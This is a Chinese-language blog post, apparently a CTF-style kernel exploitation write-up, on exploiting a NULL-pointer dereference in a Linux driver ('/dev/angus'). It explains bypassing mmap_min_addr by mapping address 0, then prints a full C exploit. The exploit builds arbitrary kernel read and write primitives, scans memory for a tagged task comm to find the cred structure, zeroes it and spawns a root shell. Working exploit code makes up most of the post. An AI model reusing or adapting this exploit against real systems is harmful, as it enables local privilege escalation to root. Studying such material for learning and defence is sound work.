@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="7r1p13J">
+
+
+
+
+
+<title>Nullptr | Hexo</title>
+
+
+
+    <link rel="icon" href="/github-11-48.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">7r1pl3J&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/link">Links</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">7r1pl3J&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/link">Links</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Nullptr</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">7r1p13J</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">December 15, 2022&nbsp;&nbsp;10:28:05</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/kernel/">kernel</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="nullptr-解引用"><a href="#nullptr-解引用" class="headerlink" title="nullptr 解引用"></a>nullptr 解引用</h1><p>nullptr 解引用一般是很难利用的，一般<strong>可以规避SMAP和mmap缓解的前提下进行的攻击</strong></p>
+<h2 id="攻击原理与缓解"><a href="#攻击原理与缓解" class="headerlink" title="攻击原理与缓解"></a>攻击原理与缓解</h2><p><a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt">作为Linux 规范</a>，虚拟内存根据地址的不同使用不同。例如，您可以自由使用用户空间<code>0000000000000000</code>from to。<code>00007fffffffffff</code>另外，<code>ffffffff80000000</code>from <code>ffffffff9fffffff</code>to是内核数据区，映射到物理地址0。</p>
+<p>Linux 将 48 位地址符号扩展为 64 位。因此，从 0x800000000000 到 0xffff7fffffffffff 的地址是非法地址，称为非规范地址。</p>
+<p><code>0000000000000000 - 00007fffffffffff</code>用户空间可以从. 也就是说，当地址 0 被映射时，一个 NULL 指针引用可以读写数据而不会导致 Segmentation Fault。内核空间中的空指针解引用可以在禁用 SMAP 时读取用户空间中的数据，因此攻击者可以使用在地址 0 处故意准备的数据。</p>
+<p><code>mmap</code>通常，当第一个参数为 0（NULL）时，内核决定映射到哪个地址。但是，<code>MAP_FIXED</code>如果你用标志映射，它总是映射到那个地址（或失败），你可以在地址 0 分配内存。（KPTI 是有效的，<code>MAP_POPULATE</code>所以不要忘记它。）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mmap( <span class="number">0</span> , <span class="number">0x1000</span> , PROT_READ|PROT_WRITE, </span><br><span class="line">     MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, <span class="number">-1</span> , <span class="number">0</span> );</span><br><span class="line">     </span><br></pre></td></tr></table></figure>
+
+<p>这种方法可以用来在攻击目标机器上的地址 0 分配内存，但是上面的代码在你常用的 Linux 机器上会失败。Linux 有一个变量<br>作为 NULL 指针取消引用的缓解措施。<code>mmap_min_addrc</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /proc/sys/vm/mmap_min_addr </span><br><span class="line"><span class="number">65536</span></span><br></pre></td></tr></table></figure>
+
+<p>没有内存可以从用户空间映射到低于该地址的地址。因此，通常NULL指针解引用是不可利用的，但在这个攻击目标中，这个值被设置为0，所以它是可利用的。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>遍历：task stuct</p>
+<p>使用prctl给comm赋值</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prctl(PR_SET_NAME, <span class="string">&quot;triplej&quot;</span>);<span class="comment">// </span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_POSIX_CPU_TIMERS_TASK_WORK</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">posix_cputimers_work</span>	<span class="title">posix_cputimers_work</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="comment">/* Cached requested key. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>			*<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * executable name, excluding path.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">	 * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">	 * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">char</span>				comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure>
+
+<p>task stuct 结构体为kmalloc 分配，位于线性映射区</p>
+<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20221206214409889.png" alt="image-20221206214409889"></p>
+<p>搜索cred：</p>
+<ul>
+<li>task_struct中存在char comm[TASK_COMM_LEN]</li>
+<li>comm字符串使用prctl函数的PR_SET_NAME自行设置</li>
+<li>在内存中搜索被设置后的comm字符串，cred结构体地址就在附近</li>
+<li>泄漏cred结构体地址，定向覆盖cred结构体</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//例题中搜索线性映射区    </span></span><br><span class="line"><span class="keyword">for</span> (addr = <span class="number">0xffff888000000000</span>, addr &lt; <span class="number">0xffffc88000000000</span>; addr += stride) &#123;</span><br><span class="line">        <span class="keyword">if</span> (addr % <span class="number">0x10000000000</span> == <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] Searching 0x%016lx...\n&quot;</span>, addr);</span><br><span class="line">        <span class="keyword">if</span> (AAR(buf, (<span class="type">char</span>*)addr, stride) != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (needle = memmem(buf, stride, <span class="string">&quot;triplej&quot;</span>, <span class="number">7</span>)) &#123;</span><br><span class="line">            addr += (needle - buf);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Found comm: 0x%016lx\n&quot;</span>, addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cred_addr=addr<span class="number">-8</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>失败：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_INIT    0x13370001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_SETKEY  0x13370002</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_SETDATA 0x13370003</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_GETDATA 0x13370004</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_ENCRYPT 0x13370005</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_DECRYPT 0x13370006</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *key;</span><br><span class="line">    <span class="type">char</span> *data;</span><br><span class="line">    <span class="type">size_t</span> keylen;</span><br><span class="line">    <span class="type">size_t</span> datalen;</span><br><span class="line">&#125; XorCipher;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *ptr;</span><br><span class="line">    <span class="type">size_t</span> len;</span><br><span class="line">&#125; <span class="type">request_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line">XorCipher *nullptr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>  <span class="title function_">angus_init</span> <span class="params">( <span class="type">void</span> )</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, CMD_INIT, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">angus_setkey</span> <span class="params">( <span class="type">char</span> *key, <span class="type">size_t</span> keylen)</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123; .ptr = key, .len = keylen &#125;;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, CMD_SETKEY, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">angus_setdata</span> <span class="params">( <span class="type">char</span> *data, <span class="type">size_t</span> datalen)</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123; .ptr = data, .len = datalen &#125;;</span><br><span class="line">    <span class="keyword">return</span> ioctl (fd, CMD_SETDATA, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">angus_getdata</span> <span class="params">( <span class="type">char</span> *data, <span class="type">size_t</span> datalen)</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123; .ptr = data, .len = datalen &#125;;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, CMD_GETDATA, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">angus_decrypt</span> <span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, CMD_ENCRYPT, &amp;req) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">angus_encrypt</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, CMD_ENCRYPT, &amp;req) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errorinfo</span><span class="params">(<span class="type">char</span> *s)</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">AAR</span> <span class="params">( <span class="type">char</span> *dst, <span class="type">char</span> *src, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    nullptr-&gt;data = src;</span><br><span class="line">    nullptr-&gt;datalen = len;</span><br><span class="line">    <span class="keyword">return</span> angus_getdata(dst, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>  <span class="title function_">AAW</span> <span class="params">( <span class="type">char</span> *dst, <span class="type">char</span> *src, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *temp = (<span class="type">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line">    AAR(temp, dst, len);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        temp[i] ^= src[i];</span><br><span class="line">    &#125;</span><br><span class="line">    nullptr-&gt;data = dst;</span><br><span class="line">    nullptr-&gt;datalen = len;</span><br><span class="line">    nullptr-&gt;key = temp;</span><br><span class="line">    nullptr-&gt;keylen = len;</span><br><span class="line">    angus_encrypt();</span><br><span class="line">    <span class="built_in">free</span>(temp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/angus&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        errorinfo(<span class="string">&quot;open failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ioctl(fd, CMD_GETDATA,)</span></span><br><span class="line">    <span class="keyword">if</span> (mmap(<span class="number">0</span>, <span class="number">0x10000</span>, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, <span class="number">-1</span> , <span class="number">0</span> ) != <span class="literal">NULL</span>)</span><br><span class="line">        errorinfo(<span class="string">&quot;mmap faile1!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    prctl(PR_SET_NAME, <span class="string">&quot;triplej&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="type">size_t</span> stride = <span class="number">0x1000000</span>;</span><br><span class="line">    <span class="type">char</span> *needle, *buf = <span class="built_in">malloc</span>(stride);</span><br><span class="line">    <span class="keyword">if</span> (!buf) &#123;</span><br><span class="line">        errorinfo(<span class="string">&quot;malloc failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (addr = <span class="number">0xffff888000000000</span>; addr &lt; <span class="number">0xffffc88000000000</span>; addr += stride) &#123;</span><br><span class="line">        <span class="keyword">if</span> (addr % <span class="number">0x10000000000</span> == <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] Searching 0x%016lx...\n&quot;</span>, addr);</span><br><span class="line">        <span class="keyword">if</span> (AAR(buf, (<span class="type">char</span>*)addr, stride) != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (needle = memmem(buf, stride, <span class="string">&quot;triplej&quot;</span>, <span class="number">7</span>)) &#123;</span><br><span class="line">            addr += (needle - buf);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Found comm: 0x%016lx\n&quot;</span>, addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (addr == <span class="number">0xffffc88000000000</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Not found&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> addr_cred;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] addr :0x%016lx\n&quot;</span>,addr);</span><br><span class="line">    AAR((<span class="type">char</span>*)&amp;addr_cred,(<span class="type">char</span>*)(addr<span class="number">-8</span>),<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] cred: 0x%016lx\n&quot;</span>, addr_cred);</span><br><span class="line"></span><br><span class="line">    AAR((<span class="type">char</span>*)&amp;addr_cred,(<span class="type">char</span>*)(addr<span class="number">-16</span>),<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] cred: 0x%016lx\n&quot;</span>, addr_cred);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> rootcred[<span class="number">0x20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    AAW((<span class="type">char</span>*)(addr_cred+<span class="number">4</span>),rootcred,<span class="number">0x20</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//     struct cred &#123;</span></span><br><span class="line"><span class="comment">//     atomic_t    usage;</span></span><br><span class="line"><span class="comment">// #ifdef CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="comment">//     atomic_t    subscribers;    /* number of processes subscribed */</span></span><br><span class="line"><span class="comment">//     void        *put_addr;</span></span><br><span class="line"><span class="comment">//     unsigned    magic;</span></span><br><span class="line"><span class="comment">// #define CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="comment">// #define CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="comment">// #endif</span></span><br><span class="line"><span class="comment">//     kuid_t      uid;        /* real UID of the task */</span></span><br><span class="line"><span class="comment">//     kgid_t      gid;        /* real GID of the task */</span></span><br><span class="line"><span class="comment">//     kuid_t      suid;       /* saved UID of the task */</span></span><br><span class="line"><span class="comment">//     kgid_t      sgid;       /* saved GID of the task */</span></span><br><span class="line"><span class="comment">//     kuid_t      euid;       /* effective UID of the task */</span></span><br><span class="line"><span class="comment">//     kgid_t      egid;       /* effective GID of the task */</span></span><br><span class="line"><span class="comment">//     kuid_t      fsuid;      /* UID for VFS ops */</span></span><br><span class="line"><span class="comment">//     kgid_t      fsgid;      /* GID for VFS ops */</span></span><br><span class="line"><span class="comment">//     unsigned    securebits; /* SUID-less security management */</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里失败让我非常疑惑，调了好一会才注意到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br></pre></td></tr></table></figure>
+
+<p>当我不添加这个define时，一直会报warning，而添加了以后就不报了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exp</span>.c:<span class="number">117</span>:<span class="number">22</span>: warning: implicit declaration of function ‘memmem’; did you mean ‘<span class="built_in">memset</span>’? [-Wimplicit-function-declaration]</span><br><span class="line">         <span class="keyword">if</span> (needle = memmem(buf, stride, <span class="string">&quot;triplej&quot;</span>, <span class="number">7</span>)) &#123;</span><br><span class="line">                      ^~~~~~</span><br><span class="line">                      <span class="built_in">memset</span></span><br><span class="line"><span class="built_in">exp</span>.c:<span class="number">117</span>:<span class="number">20</span>: warning: assignment makes pointer from integer without a cast [-Wint-conversion]</span><br><span class="line">         <span class="keyword">if</span> (needle = memmem(buf, stride, <span class="string">&quot;triplej&quot;</span>, <span class="number">7</span>)) &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>#define _GNU_SOURCE 导致 脚本不成功 ，，第一次遇到</p>
